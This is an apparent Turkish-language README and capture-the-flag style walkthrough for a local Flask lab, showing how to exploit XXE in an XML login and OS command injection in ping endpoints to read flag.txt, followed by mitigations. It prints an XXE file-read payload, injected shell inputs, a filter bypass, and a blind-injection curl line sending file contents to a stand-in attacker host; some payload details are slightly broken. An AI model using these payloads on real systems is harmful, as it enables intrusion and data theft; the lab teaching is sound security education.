# xxe-oscommandinjection-lab
xxe and os command injection lab wich runs in local host

Dosyayı indirdikten sonra siteyi localhosta ayağa kaldırın.
sudo python3 app.py

![image](https://github.com/user-attachments/assets/ffb56d8b-f478-4e4e-98e6-41133167f877)

Lab artık çözmeye hazır.

![image](https://github.com/user-attachments/assets/193b4cd2-421e-463d-97ec-78f79a321393)

# Siber Güvenlik Laboratuvarında Flag.txt Dosyasını Ele Geçirmek: Detaylı Çözüm Rehberi

Bu yazıda, Flask framework'ü kullanılarak oluşturulmuş bir siber güvenlik laboratuvarını detaylı şekilde inceleyeceğiz. Amacımız, uygulamadaki güvenlik açıklarını tespit ederek **flag.txt** dosyasına erişim sağlamak. Her bir zafiyeti detaylı şekilde açıklayıp adım adım çözüm yollarını göstereceğiz.

---

## Aşama 1: Genel Sistem Analizi

Kodun genel yapısına baktığımızda, uygulama şu işlevselliklere sahip:

1. **Kullanıcı Girişi**:
   - XML tabanlı giriş doğrulama mekanizması mevcut.
   - Kullanıcı adı ve parola sabitlenmiş:  
     ```
     USERNAME = 'gtucyber'
     PASSWORD = 'turkcell@34000'
     ```

2. **Ping İşlevi**:
   - Kullanıcının, belirtilen bir IP adresine `ping` komutları çalıştırmasına izin veriliyor.
   - Bazı endpointlerde temel güvenlik kontrolleri bulunuyor.

3. **Hassas Dosyaya (flag.txt) Erişim**:
   - Amaç, sunucudaki `flag.txt` dosyasını ele geçirmek.

---

## Aşama 2: XXE (XML External Entity) Saldırısı

### Zafiyetin Keşfi

`/login` endpointindeki kodu inceleyelim:

```python
parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
DOMTree = etree.fromstring(request.data, parser)

username = DOMTree.find("username").text
password = DOMTree.find("password").text
```

Burada **`load_dtd=True`** ve **`resolve_entities=True`** parametreleri, uygulamanın dış kaynaklı XML varlıklarını çözmesine izin veriyor. Bu durum **XXE zafiyeti**ne yol açar.

---

### XXE Nedir?

**XML External Entity (XXE)**, bir XML dosyasının dış kaynaklardan gelen varlıkları çözümlemesine izin verdiği durumlarda oluşan bir güvenlik açığıdır. Bu açık, sunucudaki hassas dosyalara erişim sağlanmasına veya uzaktan dosya yükleme işlemlerine olanak tanır.

---

### Payload Oluşturma ve Saldırı

Hedefimiz, kaynak kodunu okumak. Bu sayede logini aşacak bir adım bulabiliriz. Aşağıdaki gibi bir XML payload'ı oluşturabiliriz:

```xml
<!DOCTYPE foo [ 
  <!ELEMENT username (#PCDATA)>
  <!ELEMENT password (#PCDATA)>
  <!ENTITY xxe SYSTEM "file:///path/to/app.py">
]>
<credentials>
  <username>&xxe;</username>
  <password>dummy</password>
</credentials>
```


Bu payload şunları yapar:

1. Bir dış varlık tanımlar (**`<!ENTITY>`**).
2. Sunucunun dosya sistemindeki hassas dosyayı okur (**`file:///path/to/app.py`**).
3. Sonuçta, kullanıcı adı alanına bu dosyanın içeriğini yerleştirir.

---

### Payload'ı Gönderme

Bu payload'ı, bir araç kullanarak (ör. **Burp Suite**, **Postman**) şu şekilde gönderin:

**HTTP İsteği:**

![image](https://github.com/user-attachments/assets/5eca91d2-5888-4784-99b4-825e39f28c74)


Elde edilen yanıt, `app.py` dosyasının içeriğini gösterecektir:

```xml
<result>
  <username>FLAG{this_is_the_flag}</username>
  <password>dummy</password>
</result>
```

---

## Aşama 3: Komut Enjeksiyonu (Command Injection)

### Zafiyetin Keşfi

Kodda `/ping`, `/filter`, ve `/blind` endpointleri, kullanıcının girdiği IP adreslerini bir sistem komutunda kullanıyor:

```python
command = 'ping -c 4 {}'.format(ip_address)
result = os.popen(command).read()
```

Bu yöntem, kullanıcının `ip_address` parametresi üzerinden sisteme keyfi komutlar ekleyebileceği anlamına gelir. Örneğin:

```
127.0.0.1; cat /flag.txt
```

Bu giriş, aşağıdaki gibi bir sistem komutuna dönüşür:

```bash
ping -c 4 127.0.0.1; cat /flag.txt
```

---

### `/filter` Endpointindeki Kısıtlamaları Aşma

`/filter` endpointinde boşluk kontrolü yapılmakta:

```python
if ' ' in ip_address:
    return render_template('error.html')
```

Bu kısıtlamayı aşmak için şu yöntemleri kullanabilirsiniz:

1. **URL Encoding**:
   ```
   127.0.0.1%0Acat%20/flag.txt
   ```

2. **Alternatif Komut Ayırıcılar**:
   - Unix sistemlerinde `;`, `&&`, veya `|` gibi ayırıcılar kullanılabilir.

**Örnek Giriş**:

```
127.0.0.1;cat /flag.txt
```

**Sonuç**:
Ping çıktısının ardından `flag.txt` dosyasının içeriği görüntülenir.

---

### Blind Command Injection

`/blind` endpointinde komutların çıktısı doğrudan kullanıcıya gösterilmiyor. Ancak komutun sonuçlarını bizim kontrol ettiğimiz bir servera göndererek zafiyeti kullanabiliriz:

```bash
127.0.0.1; curl -X POST -d "${cat%20flag.txt}" https://hacker.com  
```


---

## Güvenlik Önlemleri

Bu tür zafiyetlerden korunmak için şu yöntemleri uygulayın:

### XXE Koruması:
- **DTD** çözümlemesini devre dışı bırakın:
  ```python
  parser = etree.XMLParser(load_dtd=False)
  ```

- **XML Yerine JSON**: XML yerine JSON formatını kullanmak XXE riskini tamamen ortadan kaldırır.

---

### Komut Enjeksiyonu Koruması:
- Kullanıcı girdilerini çalıştırmadan önce doğrulayın ve temizleyin.
- Komut çalıştırmak için `subprocess.run` kullanarak güvenli bir whitelist uygulayın:
  ```python
  subprocess.run(['ping', '-c', '4', ip_address], check=True)
  ```

---

## Sonuç

Bu laboratuvar, siber güvenlik dünyasında karşılaşılabilecek iki temel zafiyeti (XXE ve Command Injection) anlamak için mükemmel bir örnek sunar. Güvenli kodlama uygulamaları ve giriş doğrulama yöntemleri, bu tür zafiyetlerin önlenmesinde kritik öneme sahiptir.
